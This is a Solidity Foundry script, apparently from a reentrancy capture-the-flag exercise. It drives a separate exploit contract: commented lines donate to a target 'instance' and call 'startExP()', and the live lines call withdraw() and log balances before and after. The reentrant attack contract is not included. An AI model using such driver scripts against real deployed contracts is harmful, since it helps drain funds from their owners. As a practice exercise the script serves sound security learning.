pragma solidity ^0.8.0;

import "forge-std/Script.sol";

contract ReEntrancyScript is Script {
    function run() external {
        vm.startBroadcast();
        address expContract = address(0xF7D39BE47410F88922aD27c3686fc2b826eCec92);
        // address instanceContract = address(0xB31BA1F98e32774c775a0106f96608D0AF329731);

        // //donate to contract
        // console.log("Balance before exploit : ");
        // console.log(address(0x15F727A48fdC049e647e14627Ba8c5e6D81d423a).balance);

        // address(instanceContract).call{value: 1000000000000000}(abi.encodeWithSignature("donate(address)", address(expContract)));
        // address(expContract).call{value: 0}(abi.encodeWithSignature("startExP()"));

        // console.log("Balance after exploit : ");
        // console.log(address(expContract).balance);
        console.log("before: ");
        console.log(address(0xdCC36b9cbC0dbaDBCCFB2f5dD70e5AdB5024F707).balance);
        expContract.call{value: 0}(abi.encodeWithSignature("withdraw()"));
        console.log("after: ");
        console.log(address(0xdCC36b9cbC0dbaDBCCFB2f5dD70e5AdB5024F707).balance);

        
    }
}